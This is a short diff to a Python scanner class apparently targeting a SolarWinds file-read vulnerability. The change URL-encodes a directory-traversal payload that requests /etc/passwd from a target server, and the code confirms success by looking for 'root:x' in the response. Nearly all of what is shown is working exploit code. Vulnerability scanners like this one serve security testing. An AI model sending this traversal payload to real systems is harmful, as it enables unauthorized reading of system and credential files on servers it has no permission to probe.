@@ -31,7 +31,7 @@ class SolarWinds_File_Read_Scan:
             return False
     def get_url2(self,input_url):
         try:
-            url = input_url + "/?InternalDir=\..\..\..\..\etc&InternalFile=passwd"
+            url = input_url + "/?InternalDir=%5C..%5C..%5C..%5C..%5Cetc&InternalFile=passwd"
             req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)
             if "root:x" in req.text:
                 if not self.batch:
